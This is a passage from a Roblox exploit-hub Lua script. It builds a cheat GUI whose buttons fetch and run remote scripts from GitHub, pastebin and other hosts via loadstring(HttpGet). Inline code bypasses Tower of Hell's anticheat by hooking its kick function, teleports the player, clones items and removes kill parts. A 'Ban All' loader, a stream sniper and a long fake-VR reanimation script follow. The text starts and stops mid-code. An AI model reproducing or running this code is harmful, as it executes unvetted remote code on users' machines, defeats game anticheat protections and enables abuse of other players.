		local userId = Players:GetUserIdFromNameAsync("NannaDev")
		local thumbType = Enum.ThumbnailType.HeadShot
		local thumbSize = Enum.ThumbnailSize.Size420x420
		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)


		-- Chat message (Updated for new chat system)
		local function SendChatMessage(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
	end    
})


Tab:AddButton({
	Name = "Telekinesis",
	Callback = function()
		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua"))()
	end    
})




local Section = Tab:AddSection({
	Name = "MM2"
})


Tab:AddButton({
	Name = "MM2 GUI | NEXUS",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
	end    
})



local Section = Tab:AddSection({
	Name = "Dandys World"
})

Tab:AddButton({
	Name = "VoidWare",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Smartlightyear/Dandy-sWordVoidWare/main/script.lua"))()

	end    
})

Tab:AddButton({
	Name = "DandysWorldGUI",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Dandy's-World-ALPHA-G0bbyD0llan-DW-Update-5-25695"))()
	end    
})





local Section = Tab:AddSection({
	Name = "Blade Ball"
})


Tab:AddButton({
	Name = "Bakugan Blade Ball",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/Bakugan/refs/heads/main/Bakugan.lua", true))()

	end    
})


local Section = Tab:AddSection({
	Name = "Tower of Hell"
})


Tab:AddButton({
	Name = "TOH Gui",
	Callback = function()
		--[[ NOT MY SCRIPT IT WAS MADE BY TECH HOG! ]]
		--[[https://www.youtube.com/@TechHog8984 THERE CHANNEL!]]

		local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vep1032/VepStuff/main/VL"))()

		local s = VLib:Window("Tower Of Hell Gui", "By TheMystery_O_O", "TOH")

		local ss = s:Tab("General")

		ss:Button("Bypass Anticheat",function()  -- Credits For The Bypass To https://www.youtube.com/watch?v=SlPzMVf-lNQ&t=0s
			local reg = getreg()

			for i, Function in next, reg do
				if type(Function) == 'function' then
					local info = getinfo(Function)

					if info.name == 'kick' then
						if (hookfunction(info.func, function(...)end)) then
							print'succesfully hooked kick'
						else
							print'failed to hook kick'
						end
					end
				end
			end
			local playerscripts = game:GetService'Players'.LocalPlayer.PlayerScripts

			local script1 = playerscripts.LocalScript
			local script2 = playerscripts.LocalScript2

			local script1signal = script1.Changed
			local script2signal = script2.Changed

			for i, connection in next, getconnections(script1signal) do
				connection:Disable()
			end
			for i, connection in next, getconnections(script2signal) do
				connection:Disable()
			end

			script1:Destroy()
			script2:Destroy()
		end)

		ss:Button("Go To End",function()
			local endzone = game.Workspace.tower.sections.finish.FinishGlow.CFrame

			local player = game.Players.LocalPlayer.Character
			player.HumanoidRootPart.CFrame = endzone
		end)

		ss:Button("Get All Items",function()
			for _,e in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
				if e:IsA("Tool") then
					e:Destroy()
				end
			end
			wait() 
			for _,v in pairs(game.ReplicatedStorage.Gear:GetDescendants()) do
				if v:IsA("Tool") then
					local CloneThings = v:Clone()
					wait()
					CloneThings.Parent = game.Players.LocalPlayer.Backpack

				end
			end
		end)

		ss:Button("God Mode (Remove KillParts)",function()
			for i,v in pairs(game:GetService("Workspace").tower:GetDescendants()) do
				if v:IsA("BoolValue") and v.Name == "kills" then
					v.Parent:Destroy()
				end
			end
		end)

		ss:Slider("WalkSpeed",0,500,16,function(t)
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = t
		end)

		ss:Slider("JumpPower",0,500,50,function(t)
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = t
		end)

		ss:Button("Reset Walk and Jump",function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
		end)

		ss:Button("IY (Infinite Yield)",function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
		end)

		ss:Button("Anti Lag",function()
			loadstring(game:HttpGet('https://pastebin.com/raw/eVHmQQvQ'))()
		end)

		local sss = s:Tab("Auto Farm")

		-- Table
		getgenv().Boolean = false

		sss:Toggle("Auto Farm",function(v)
			getgenv().Boolean = v

			if v then -- if v == true then
				name()
			end
		end)

		-- function
		function name()
			spawn(function()
				while getgenv().Boolean == true do
					local endzone = game.Workspace.tower.sections.finish.FinishGlow.CFrame

					local player = game.Players.LocalPlayer.Character
					player.HumanoidRootPart.CFrame = endzone
					wait()
				end
			end)
		end

		sss:Button("Anti Afk",function()
			local vu = game:GetService("VirtualUser")
			game:GetService("Players").LocalPlayer.Idled:connect(function()
				vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
				wait(1)
				vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
			end)
		end)


		local ssss = s:Tab("Credits")

		ssss:Label("Gui By TheMystery_O_O in robloxscripts")
		ssss:Label("forum.robloxscripts.com/member.php?action=profile&uid=48177")
		ssss:Label("Ui Lib By Vep in robloxscripts")
		ssss:Label("forum.robloxscripts.com/member.php?action=profile&uid=4869")
		ssss:Label("AntiCheat Bypass By TechHog")
		ssss:Label("Video Link: (youtube.com/watch?v=SlPzMVf-lNQ&t=0s)")  
	end    
})



local Section = Tab:AddSection({
	Name = "Dress To Impress"
})


Tab:AddButton({
	Name = "DTI Gui | Flipper",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua",true))()
	end    
})






local Section = Tab:AddSection({
	Name = "Fisch"
})


Tab:AddButton({
	Name = "Fisch Ratio Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
	end    
})





Tab:AddButton({
	Name = "KiciaHook",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
	end    
})




Tab:AddButton({
	Name = "Hidden Hub ",
	Callback = function()

		print("Key: 1CggV7Zw8DGxdblLGdROXvolkd9EtsuU, Join Discord If Key Is Not Working: https://discord.gg/hiddenrbx")

		--Key: 1CggV7Zw8DGxdblLGdROXvolkd9EtsuU
		--Join Discord If Key Is Not Working: https://discord.gg/hiddenrbx 

		loadstring(game:HttpGet("https://raw.githubusercontent.com/tulontop/HiddenRevamp/refs/heads/main/Loader.luau"))()  
	end    
})




Tab:AddButton({
	Name = "Naok iHub",
	Callback = function()
		loadstring(game:HttpGet("https://naokihub.vercel.app",true))()
	end    
})




local Tab = Window:MakeTab({
	Name = "> Features",
	Icon = "rbxassetid://107642772703957",
	PremiumOnly = false
})



Tab:AddParagraph("Server Features","- FE")


local Section = Tab:AddSection({
	Name = "Game Scripts"
})

Tab:AddButton({
	Name = "Ban All - (Works in some Games - https://discord.gg/aG6KdRje3x)",
	Callback = function()
		loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
	end    
})

Tab:AddButton({
	Name = "Stream Sniper",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Sniper.lua"))()
	end
})

Tab:AddLabel("---------------------------------------")


Tab:AddParagraph("Player Features","- FE")

local Section = Tab:AddSection({
	Name = "Hat Scripts"
})

Tab:AddButton({
	Name = "Mesh Remover",
	Callback = function()
		--mesh converter
		local removedHats = {}
		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Accessory") then
				if v.Handle:FindFirstChildOfClass("Mesh") or v.Handle:FindFirstChildOfClass("SpecialMesh") then
					if v.Handle:FindFirstChildOfClass("SpecialMesh") then
						v.Handle:FindFirstChildOfClass("SpecialMesh"):Remove()
						table.insert(removedHats, v.Name)
					end
				end
			end
		end

		if #removedHats > 0 then
			game.StarterGui:SetCore("SendNotification", {
				Title = "The Meshes have been removed from your hats [✓]",
				Text = "",
				Duration = 5,
			})
			game.StarterGui:SetCore("SendNotification", {
				Title = "Hats that were Unmeshed:",
				Text = table.concat(removedHats, "\n"),
				Duration = 8.5,
			})
		end
	end    
})


local Section = Tab:AddSection({
	Name = "Chat Scripts"
})

Tab:AddButton({
	Name = "Draw In Chat",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/balditeacher/obfuscated-mobile-supportloadstring/main/obfuscated"))()
	end    
})

local Section = Tab:AddSection({
	Name = "Vr Scripts"
})

Tab:AddButton({
	Name = "Fake VR",
	Callback = function()
--[[ VR SSXCIPRT

	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
re-released by discord.gg/dogpower & modified by https://discord.gg/Hbq3TgAJbB

       ____________         __             ____________             ___  ___     ____________
      / __________/        / /            / __________ \           /  / /  /    /  _______  /
     / /                  / /            / /          \ \         /  / /  /    /  /      / /
    / /                  / /            / /            \ \       /  / /  /    /  /______/ /
   / /                  / /            / /              \ \     /  / /  /    /      _____/
  / /                  / /             \ \              / /    /  / /  /    /       \
 / /                  / /               \ \            / /    /  / /  /    /    /\   \
/ /____________      / /___________      \ \__________/ /    /   \/  /    /    /  \   \
\_____________/     /_____________/       \____________/     \______/    /____/    \___\
----------------------------------------------------------------------------------------

]]

		--[[---------Settings---------]]--
		local bodyTransparency = 0 --Change the transparency of your character (0 - 1)
		local bodyVelocity = {-17.7, 0, -17.7} --Change your body parts velocity. First number value is the X value. Second number value is the Y value. Third number value is the Z value.
		local hatVelocity = {-17.7, 0, -17.7} --Change your accessory's velocity. First number value is the X value. Second number value is the Y value. Third number value is the Z value.
		--Velocity is not recommended to be (-17.7, 0, -17.7) in R15 since body parts often fall in R15.
		--[[--------------------------]]--

		local player1 = game.Players.LocalPlayer
		local character1 = player1.Character

		--Fake Character--
		--Create Attachment Function
		local function CreateAttachment(parent, position, orientation, axis, secondaryAxis, name)
			local newAttchment = Instance.new("Attachment", parent)
			newAttchment.Position = position
			newAttchment.Orientation = orientation
			newAttchment.Axis = axis
			newAttchment.SecondaryAxis = secondaryAxis
			newAttchment.Name = name
		end

		--Variables
		local player1 = game:GetService("Players").LocalPlayer
		local character1 = player1.Character
		local hrp = character1.HumanoidRootPart

		for i,v in pairs(character1:GetChildren()) do
			if v:IsA("LocalScript") then
				v:Destroy()
			end
		end

		local camera = workspace.CurrentCamera

		local reanimFolder = Instance.new("Folder", character1)
		reanimFolder.Name = "FakeCharacter"

		local model = Instance.new("Model", reanimFolder)
		model.Name = "Reanimation"

		local userInputService = game:GetService("UserInputService")
		local movingW, movingA, movingS, movingD, jumping = false

		--Body Parts--
		--Head
		local cHead = Instance.new("Part", model)
		cHead.Size = Vector3.new(2, 1, 1)
		cHead.Name = "Head"

		--Torso
		local cTorso = Instance.new("Part", model)
		cTorso.Size = Vector3.new(2, 2, 1)
		cTorso.Name = "Torso"

		--Left Arm
		local cLArm = Instance.new("Part", model)
		cLArm.Size = Vector3.new(1, 2, 1)
		cLArm.Name = "Left Arm"

		--Right Arm
		local cRArm = Instance.new("Part", model)
		cRArm.Size = Vector3.new(1, 2, 1)
		cRArm.Name = "Right Arm"

		--Left Leg
		local cLLeg = Instance.new("Part", model)
		cLLeg.Size = Vector3.new(1, 2, 1)
		cLLeg.Name = "Left Leg"

		--Right Leg
		local cRLeg = Instance.new("Part", model)
		cRLeg.Size = Vector3.new(1, 2, 1)
		cRLeg.Name = "Right Leg"

		--HumanoidRootPart
		local cHRP = Instance.new("Part", model)
		cHRP.Size = Vector3.new(2, 2, 1)
		cHRP.Name = "HumanoidRootPart"
		cHRP.Transparency = 1
		cHRP.CanCollide = false

		--Transparency
		for i,v in pairs(model:GetChildren()) do
			if v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
				v.Transparency = 1--0.5
			end
		end

		--Joints--
		--Right Shoulder
		local rShoulder = Instance.new("Motor6D", cTorso)
		rShoulder.Part0 = cTorso
		rShoulder.Part1 = cRArm
		rShoulder.Name = "Right Shoulder"
		rShoulder.C0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
		rShoulder.C1 = CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)

		--Left Shoulder
		local lShoulder = Instance.new("Motor6D", cTorso)
		lShoulder.Part0 = cTorso
		lShoulder.Part1 = cLArm
		lShoulder.Name = "Left Shoulder"
		lShoulder.C0 = CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
		lShoulder.C1 = CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)

		--Right Hip
		local rHip = Instance.new("Motor6D", cTorso)
		rHip.Part0 = cTorso
		rHip.Part1 = cRLeg
		rHip.Name = "Right Hip"
		rHip.C0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
		rHip.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)

		--Left Hip
		local lHip = Instance.new("Motor6D", cTorso)
		lHip.Part0 = cTorso
		lHip.Part1 = cLLeg
		lHip.Name = "Left Hip"
		lHip.C0 = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
		lHip.C1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)

		--Neck
		local neck = Instance.new("Motor6D", cTorso)
		neck.Part0 = cTorso
		neck.Part1 = cHead
		neck.Name = "Neck"
		neck.C0 = CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
		neck.C1 = CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)

		--RootJoint
		local rootJoint = Instance.new("Motor6D", cHRP)
		rootJoint.Part0 = cHRP
		rootJoint.Part1 = cTorso
		rootJoint.Name = "RootJoint"
		rootJoint.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
		rootJoint.C1 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)

		--Humanoid--
		local cHumanoid = Instance.new("Humanoid", model)
		cHumanoid.DisplayDistanceType = "None"

		--Head Mesh--
		local headMesh = Instance.new("SpecialMesh", cHead)
		headMesh.Scale = Vector3.new(1.25, 1.25, 1.25)

		local reanimation = model

		--Creating Attachments
		CreateAttachment(cHead, Vector3.new(0,0.60000002384186,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "HairAttachment")
		CreateAttachment(cHead, Vector3.new(0,0.60000002384186,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "HatAttachment")
		CreateAttachment(cHead, Vector3.new(0,0,-0.60000002384186), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "FaceFrontAttachment")
		CreateAttachment(cHead, Vector3.new(0,0,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "FaceCenterAttachment")
		CreateAttachment(cTorso, Vector3.new(0,1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "NeckAttachment")
		CreateAttachment(cTorso, Vector3.new(0,0,-0.5), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "BodyFrontAttachment")
		CreateAttachment(cTorso, Vector3.new(0,0,0.5), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "BodyBackAttachment")
		CreateAttachment(cTorso, Vector3.new(-1,1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "LeftCollarAttachment")
		CreateAttachment(cTorso, Vector3.new(1,1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "RightCollarAttachment")
		CreateAttachment(cTorso, Vector3.new(0,-1,-0.5), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "WaistFrontAttachment")
		CreateAttachment(cTorso, Vector3.new(0,-1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "WaistCenterAttachment")
		CreateAttachment(cTorso, Vector3.new(0,-1,0.5), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "WaistBackAttachment")
		CreateAttachment(cLArm, Vector3.new(0,1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "LeftShoulderAttachment")
		CreateAttachment(cLArm, Vector3.new(0,-1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "LeftGripAttachment")
		CreateAttachment(cRArm, Vector3.new(0,1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "RightShoulderAttachment")
		CreateAttachment(cRArm, Vector3.new(0,-1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "RightGripAttachment")
		CreateAttachment(cLLeg, Vector3.new(0,-1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "LeftFootAttachment")
		CreateAttachment(cRLeg, Vector3.new(0,-1,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "RightFootAttachment")
		CreateAttachment(cHRP, Vector3.new(0,0,0), Vector3.new(-0,0,0), Vector3.new(1,0,0), Vector3.new(0,1,0), "RootAttachment")

		--Cloning Hats (For Netless)
		for i,v in pairs(character1:GetChildren()) do
			if v:IsA("Accessory") then
				local clone = v:Clone()
				local weld = v.Handle:FindFirstChildWhichIsA("Weld")
				local weldPart1 = weld.Part1
				local newWeld = Instance.new("Weld", clone.Handle)
				local CFrame0 = v.Handle.AccessoryWeld.C0
				local CFrame1 = v.Handle.AccessoryWeld.C1

				clone.Handle:FindFirstChild("AccessoryWeld"):Destroy()
				clone.Parent = reanimation
				newWeld.Name = "AccessoryWeld"
				newWeld.C0 = CFrame0
				newWeld.C1 = CFrame1
				newWeld.Part0 = clone.Handle
				newWeld.Part1 = character1:FindFirstChild(weldPart1.Name)
				clone.Handle.Transparency = 1
			end
		end

		cHRP.CFrame = hrp.CFrame

		-- CLOVR - FE FULL-BODY VR SCRIPT

		-- April 21st Update - TOOL HOLDING ADDED

		-- | made by 0866 and Abacaxl
		-- | tysm unverified

		--RagDollEnabled is set to true, DON'T set it to false or CLOVR won't work. Feel free to change the other settings though. -Abacaxl

		--|| Settings:
		local StudsOffset = 0 -- Character height (negative if you're too high)
		local Smoothness = .5 -- Character interpolation (0.1 - 1 = smooth - rigid)
		local AnchorCharacter = false -- Prevent physics from causing inconsistencies
		local HideCharacter = false -- Hide character on a platform
		local NoCollision = false-- Disable player collision
		local ChatEnabled = true -- See chat on your left hand in-game
		local ChatLocalRange = 75 -- Local chat range
		local ViewportEnabled = true -- View nearby players in a frame
		local ViewportRange = 30 -- Maximum distance players are updated
		local RagdollEnabled = true -- Use your character instead of hats (NetworkOwner vulnerability)
		local RagdollHeadMovement = true -- Move your head separately from your body (+9 second wait)
		local AutoRun = false -- Run script on respawn
		local AutoRespawn = true -- Kill your real body when your virtual body dies
		local WearAllAccessories = true -- Use all leftover hats for the head
		local AccurateHandPosition = true -- Move your Roblox hands according to your real hands
		local AccessorySettings = {
			LeftArm = "",
			RightArm = "",
			LeftLeg = "",
			RightLeg = "",
			Torso = "",
			Head = true,
			BlockArms = true,
			BlockLegs = true,
			BlockTorso = true,
			LimbOffset = CFrame.Angles(math.rad(90), 0, 0)
		}
		local FootPlacementSettings = {
			RightOffset = Vector3.new(.5, 0, 0),
			LeftOffset = Vector3.new(-.5, 0, 0)
		}
		--|| Script:
		local Script = nil
		Script = function()
    --[[
 Variables
--]]
			local Players = game:GetService("Players")
			local Client = Players.LocalPlayer
			local Character = Client.Character or Client.CharacterAdded:Wait()
			local WeldBase = Character:WaitForChild("HumanoidRootPart")
			local ArmBase = Character:FindFirstChild("RightHand") or Character:FindFirstChild("Right Arm") or WeldBase
			local Backpack = Client:WaitForChild("Backpack")
			local Mouse = Client:GetMouse()
			local Camera = workspace.CurrentCamera
			local VRService = game:GetService("VRService")
			local VRReady = VRService.VREnabled
			local UserInputService = game:GetService("UserInputService")
			local RunService = game:GetService("RunService")
			local HttpService = game:GetService("HttpService")
			local StarterGui = game:GetService("StarterGui")
			local HeadAccessories = {}
			local UsedAccessories = {}
			local Pointer = false
			local Point1 = false
			local Point2 = false
			local VirtualRig = game:GetObjects("rbxassetid://4468539481")[1]
			local VirtualBody = game:GetObjects("rbxassetid://4464983829")[1]
			local Anchor = Instance.new("Part")
			Anchor.Anchored = true
			Anchor.Transparency = 1
			Anchor.CanCollide = false
			Anchor.Parent = workspace
    --[[
    if RagdollEnabled then
        print("RagdollEnabled, thank you for using CLOVR!")
        local NetworkAccess =
            coroutine.create(
            function()
                settings().Physics.AllowSleep = false
                while true do
                    game:GetService("RunService").RenderStepped:Wait()
                    for _, Players in next, game:GetService("Players"):GetChildren() do
                        if Players ~= game:GetService("Players").LocalPlayer then
                            Players.MaximumSimulationRadius = 0.1
                            Players.SimulationRadius = 0
                        end
                    end
                    game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
                    game:GetService("Players").LocalPlayer.SimulationRadius = math.huge * math.huge
                end
            end
        )
        coroutine.resume(NetworkAccess)
    end
    ]]
			StarterGui:SetCore("VRLaserPointerMode", 3)
    --[[
 Character Protection
--]]
			local CharacterCFrame = WeldBase.CFrame
			if not RagdollEnabled then
				Character.Humanoid.AnimationPlayed:Connect(
					function(Animation)
						Animation:Stop()
					end
				)
				for _, Track in next, Character.Humanoid:GetPlayingAnimationTracks() do
					Track:Stop()
				end
				if HideCharacter then
					local Platform = Instance.new("Part")
					Platform.Anchored = true
					Platform.Size = Vector3.new(100, 5, 100)
					Platform.CFrame = CFrame.new(0, 10000, 0)
					Platform.Transparency = 1
					Platform.Parent = workspace
					Character:MoveTo(Platform.Position + Vector3.new(0, 5, 0))
					wait(.5)
				end
				if AnchorCharacter then
					for _, Part in pairs(Character:GetChildren()) do
						if Part:IsA("BasePart") then
							Part.Anchored = true
						end
					end
				end
			end
    --[[
 Functions
--]]
			function Tween(Object, Style, Direction, Time, Goal)
				local tweenInfo = TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction])
				local tween = game:GetService("TweenService"):Create(Object, tweenInfo, Goal)
				tween.Completed:Connect(
					function()
						tween:Destroy()
					end
				)
				tween:Play()
				return tween
			end
			local function GetMotorForLimb(Limb)
				for _, Motor in next, Character:GetDescendants() do
					if Motor:IsA("Motor6D") and Motor.Part1 == Limb then
						return Motor
					end
				end
			end
			local function CreateAlignment(Limb, Part0)
				local Attachment0 = Instance.new("Attachment", Part0 or Anchor)
				local Attachment1 = Instance.new("Attachment", Limb)
				local Orientation = Instance.new("AlignOrientation")
				local Position = Instance.new("AlignPosition")
				Orientation.Attachment0 = Attachment1
				Orientation.Attachment1 = Attachment0
				Orientation.RigidityEnabled = false
				Orientation.MaxTorque = 20000
				Orientation.Responsiveness = 40
				Orientation.Parent = reanimation["HumanoidRootPart"]

				Orientation.Name = Limb.Name.."'s AlignRot"
				Orientation.MaxAngularVelocity = 100

				Position.Attachment0 = Attachment1
				Position.Attachment1 = Attachment0
				Position.RigidityEnabled = false
				Position.MaxForce = 40000
				Position.Responsiveness = 40
				Position.Parent = reanimation["HumanoidRootPart"]

				Position.Name = Limb.Name.."'s AlignPos"
				Position.MaxVelocity = 100

				Limb.Massless = false
				local Motor = GetMotorForLimb(Limb)
				if Motor then
					Motor:Destroy()
				end
				return function(CF, Local)
					if Local then
						Attachment0.CFrame = CF
					else
						Attachment0.WorldCFrame = CF
					end
				end
			end
			local function GetExtraTool()
				for _, Tool in next, Character:GetChildren() do
					if Tool:IsA("Tool") and not Tool.Name:match("LIMB_TOOL") then
						return Tool
					end
				end
			end
			local function GetGripForHandle(Handle)
				for _, Weld in next, Character:GetDescendants() do
					if Weld:IsA("Weld") and (Weld.Part0 == Handle or Weld.Part1 == Handle) then
						return Weld
					end
				end
				wait(.2)
				for _, Weld in next, Character:GetDescendants() do
					if Weld:IsA("Weld") and (Weld.Part0 == Handle or Weld.Part1 == Handle) then
						return Weld
					end
				end
			end
			local function CreateRightGrip(Handle)
				local RightGrip = Instance.new("Weld")
				RightGrip.Name = "RightGrip"
				RightGrip.Part1 = Handle
				RightGrip.Part0 = WeldBase
				RightGrip.Parent = WeldBase
				return RightGrip
			end
			local function CreateAccessory(Accessory, DeleteMeshes)
				if not Accessory then
					return
				end
				local HatAttachment = Accessory.Handle:FindFirstChildWhichIsA("Attachment")
				local HeadAttachment = VirtualRig:FindFirstChild(HatAttachment.Name, true)
				local BasePart = HeadAttachment.Parent
				local HatAtt = HatAttachment.CFrame
				local HeadAtt = HeadAttachment.CFrame
				if DeleteMeshes then
					if Accessory.Handle:FindFirstChild("Mesh") then
						Accessory.Handle.Mesh:Destroy()
					end
				end
				wait()
				local Handle = Accessory:WaitForChild("Handle")
				if Handle:FindFirstChildWhichIsA("Weld", true) then
					Handle:FindFirstChildWhichIsA("Weld", true):Destroy()
					Handle:BreakJoints()
				else
					Handle:BreakJoints()
				end
				Handle.Massless = true
				Handle.Transparency = 0.5
				UsedAccessories[Accessory] = true
				local RightGrip = CreateRightGrip(Handle)
				wait()
				for _, Object in pairs(Handle:GetDescendants()) do
					if not Object:IsA("BasePart") then
						pcall(
							function()
								Object.Transparency = 1
							end
						)
						pcall(
							function()
								Object.Enabled = false
							end
						)
					end
				end
				return Handle, RightGrip, HatAtt, HeadAtt, BasePart
			end
			local function GetHeadAccessories()
				for _, Accessory in next, Character:GetChildren() do
					if Accessory:IsA("Accessory") and not UsedAccessories[Accessory] then
						local Handle, RightGrip, HatAtt, HeadAtt, BasePart = CreateAccessory(Accessory)
						table.insert(HeadAccessories, {Handle, RightGrip, HatAtt, HeadAtt, BasePart})
						do
							Handle.Transparency = 1
						end
						if not WearAllAccessories then
							break
						end
					end
				end
			end
    --[[
 VR Replication Setup
--]]
			if not RagdollEnabled then
				LeftHandle, LeftHandGrip =
					CreateAccessory(Character:FindFirstChild(AccessorySettings.LeftArm), AccessorySettings.BlockArms)
				RightHandle, RightHandGrip =
					CreateAccessory(Character:FindFirstChild(AccessorySettings.RightArm), AccessorySettings.BlockArms)
				LeftHipHandle, LeftLegGrip =
					CreateAccessory(Character:FindFirstChild(AccessorySettings.LeftLeg), AccessorySettings.BlockLegs)
				RightHipHandle, RightLegGrip =
					CreateAccessory(Character:FindFirstChild(AccessorySettings.RightLeg), AccessorySettings.BlockLegs)
				TorsoHandle, TorsoGrip =
					CreateAccessory(Character:FindFirstChild(AccessorySettings.Torso), AccessorySettings.BlockTorso)
				GetHeadAccessories()
			elseif RagdollEnabled then
				if RagdollHeadMovement then
					Permadeath()
					MoveHead = CreateAlignment(reanimation["Head"])
				end
				MoveRightArm = CreateAlignment(reanimation["Right Arm"])
				MoveLeftArm = CreateAlignment(reanimation["Left Arm"])
				MoveRightLeg = CreateAlignment(reanimation["Right Leg"])
				MoveLeftLeg = CreateAlignment(reanimation["Left Leg"])
				MoveTorso = CreateAlignment(reanimation["Torso"])
				MoveRoot = CreateAlignment(reanimation["HumanoidRootPart"])
				--
				if RagdollHeadMovement then
					for _, Accessory in next, reanimation:GetChildren() do
						if Accessory:IsA("Accessory") and Accessory:FindFirstChild("Handle") then
							local Attachment1 = Accessory.Handle:FindFirstChildWhichIsA("Attachment")
							local Attachment0 = reanimation:FindFirstChild(tostring(Attachment1), true)
							local Orientation = Instance.new("AlignOrientation")
							local Position = Instance.new("AlignPosition")
							print(Attachment1, Attachment0, Accessory)

							Orientation.Attachment0 = Attachment1
							Orientation.Attachment1 = Attachment0
							Orientation.RigidityEnabled = false
							Orientation.ReactionTorqueEnabled = true
							Orientation.MaxTorque = 20000
							Orientation.Responsiveness = 40
							Orientation.Parent = reanimation["Head"]

							Position.Attachment0 = Attachment1
							Position.Attachment1 = Attachment0
							Position.RigidityEnabled = false
							Position.ReactionForceEnabled = true
							Position.MaxForce = 40000
							Position.Responsiveness = 40
							Position.Parent = reanimation["Head"]
						end
					end
				end

			end
    --[[
 Movement
--]]
			VirtualRig.Name = "VirtualRig"
			VirtualRig.RightFoot.BodyPosition.Position = CharacterCFrame.p
			VirtualRig.LeftFoot.BodyPosition.Position = CharacterCFrame.p
			VirtualRig.Parent = workspace
			VirtualRig:SetPrimaryPartCFrame(CharacterCFrame)
			VirtualRig.Humanoid.Health = 0
			--VirtualRig:FindFirstChild("HumanoidRootPart").CFrame = character1.HumanoidRootPart.CFrame
			VirtualRig:BreakJoints()
			for i,v in pairs(VirtualRig:GetChildren()) do
				if v:IsA("BasePart") then
					v.CFrame = character1.HumanoidRootPart.CFrame
				end
			end
			--
			VirtualBody.Parent = workspace
			VirtualBody.Name = "VirtualBody"
			VirtualBody.Humanoid.WalkSpeed = 8
			VirtualBody.Humanoid.CameraOffset = Vector3.new(0, StudsOffset, 0)
			VirtualBody:SetPrimaryPartCFrame(CharacterCFrame)
			VirtualBody.Humanoid.Died:Connect(
				function()
					print("Virtual death")
					if AutoRespawn then
						Character:BreakJoints()
						if RagdollHeadMovement and RagdollEnabled then
							--Network:Unclaim()
							Respawn()
						end
					end
				end
			)
			--
